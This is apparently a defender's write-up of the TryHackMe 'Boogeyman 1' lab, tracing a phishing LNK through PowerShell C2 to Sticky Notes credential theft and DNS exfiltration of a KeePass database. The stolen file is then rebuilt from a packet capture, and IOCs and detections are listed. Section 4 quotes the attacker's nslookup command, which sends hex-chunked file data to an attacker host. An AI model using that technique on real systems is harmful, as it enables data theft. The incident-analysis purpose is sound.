# Phishing to DNS exfiltration — reconstructing a stolen password database (TryHackMe: Boogeyman 1)

**Type:** lab exercise (TryHackMe, "Boogeyman 1", SOC Level 1 **Capstone Challenge**)
**Role:** SOC L1 / incident responder
**Goal:** trace a phishing email to the attacker's objective (a stolen password database) using the email, PowerShell logs and a packet capture, then rebuild the exfiltrated file from network traffic.

> Lab exercise, not a real incident. The KeePass master password and the contents of the stolen database are redacted.

**Victim org:** Quick Logistics LLC
**Data sources:** phishing email (`.eml`), PowerShell ScriptBlock logs (JSON Lines), packet capture.
**Tooling:** Thunderbird, `lnkparse`, `jq`, Wireshark / tshark, Python, `xxd`, KeePass.

---

## 1. Initial access: phishing email

The email carried a **password-protected ZIP**, with the password written in the email body. Encrypting the archive stops mail gateways from scanning its contents.

- Pitfall: the `Invoice.zip` placed next to the email on disk was **0 bytes**. The real archive had to be saved from the email itself.
- Inside the archive: `Invoice_20230103.lnk`. Parsing the shortcut with `lnkparse` showed its target: a hidden PowerShell process with a **base64-encoded command** that pulls the next stage from the attacker's infrastructure.

## 2. Command and control

The PowerShell logs (`powershell.json`, one JSON object per line) give the attacker's session in order:

```bash
jq -s -r 'sort_by(.Timestamp) | .[].ScriptBlockText' powershell.json
```

| Property | Value |
|---|---|
| C2 domains | `cdn.bpakcaging.xyz`, `files.bpakcaging.xyz` |
| Tasking | HTTP `GET` (base64) |
| Output | HTTP `POST`, body encoded as decimal byte values |
| Payload server | `SimpleHTTP/0.6 Python/3.10.7`: a plain Python HTTP server |

Decoding every POST body from the pcap reconstructs the output of each command the operator ran:

```bash
tshark -r capture.pcapng -Y 'http.request.method=="POST" && http.host contains bpakcaging' \
  -T fields -e http.file_data | python3 -c "
import sys
for line in sys.stdin:
    out = ''.join(chr(int(n)) for n in line.split() if n.isdigit())
    if out.strip(): print(out); print('=====')
"
```

## 3. Discovery and credential access

- **Seatbelt** (`Invoke-Seatbelt.ps1`, downloaded from GitHub) ran host enumeration.
- The attacker dropped **`sq3.exe`**, a renamed `sqlite3`, and queried the Microsoft Sticky Notes database:
  `...\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`
- One of the victim's notes held the **master password** of a KeePass database (`protected_data.kdbx`) in the user's Documents folder (redacted).

## 4. Exfiltration over DNS

The `.kdbx` file was read as bytes, hex-encoded, and sent in chunks as DNS queries:

```
nslookup -q=A <hex-chunk>.bpakcaging.xyz 167.71.211.113
```

Every query carries part of the file in its subdomain, and the "DNS server" is the attacker's host. HTTP inspection sees nothing, because no file ever crosses HTTP.

### Rebuilding the stolen file

```bash
tshark -r capture.pcapng -Y "dns.flags.response==0 && dns.qry.name contains bpakcaging" \
  -T fields -e dns.qry.name \
  | grep -E "^[0-9a-fA-F]+\.bpakcaging\.xyz$" \
  | sed 's/\.bpakcaging\.xyz//' | tr -d '\n' > hex.txt
xxd -r -p hex.txt protected_data.kdbx
```

The first attempts produced a corrupted database. Each failure pointed to a different filtering mistake:

| Symptom | Cause | Fix |
|---|---|---|
| File twice as long as expected | queries **and** responses both carry the name | `dns.flags.response==0` |
| `xxd` stops after a few bytes | non-hex separators in the stream | keep only the hex labels |
| Garbage bytes mixed in | queries for the bare domain leak letters (`b`, `a`, `c`) into the stream | `grep` only names that are **pure hex + domain** |

With the master password from Sticky Notes, the rebuilt file opened in KeePass. It held the company's payment card details (redacted).

## 5. IOCs

| Type | Indicator |
|---|---|
| Domain | `bpakcaging.xyz` (`cdn.`, `files.`) |
| IP | `167.71.211.113` (DNS exfiltration endpoint) |
| File | `Invoice_20230103.lnk` (initial payload), `sq3.exe` (renamed sqlite3) |
| Tool | Seatbelt (`Invoke-Seatbelt.ps1`) |
| Target data | `plum.sqlite` (Sticky Notes), `protected_data.kdbx` (KeePass) |

## 6. ATT&CK mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1566.001 Spearphishing Attachment |
| Execution | T1204.002 Malicious File (LNK); T1059.001 PowerShell |
| Defense Evasion | T1027 Obfuscated/encrypted payload (ZIP password, base64); T1036.005 Masquerading (`sq3.exe`) |
| Discovery | T1082 System Information Discovery (Seatbelt) |
| Credential Access | T1552.001 Credentials in Files (Sticky Notes); T1555.005 Password Managers |
| Command & Control | T1071.001 Web Protocols; T1132.001 Standard Encoding |
| Exfiltration | T1048.003 Exfiltration over unencrypted non-C2 protocol (DNS) |

## 7. Detection & response

**High-value detections**
- `.lnk` from an email attachment spawning `powershell.exe` with `-enc` / hidden window.
- `nslookup.exe` launched by PowerShell, especially with an explicit DNS server.
- High volume of DNS queries to one domain with long, high-entropy subdomains.
- Any process reading `plum.sqlite` that is not Sticky Notes.

**Response**
- Isolate the host, block `bpakcaging.xyz` and `167.71.211.113`.
- Treat everything in the KeePass database as compromised: rotate every credential in it and contact the card issuer.
- Advise users against keeping secrets in Sticky Notes; restrict outbound DNS to internal resolvers only.

---

## Techniques & tools

`Email analysis` · `lnkparse` · `jq (JSON Lines)` · `Wireshark / tshark` · `Python` · `xxd` · `KeePass` · DNS exfiltration reconstruction · MITRE ATT&CK mapping
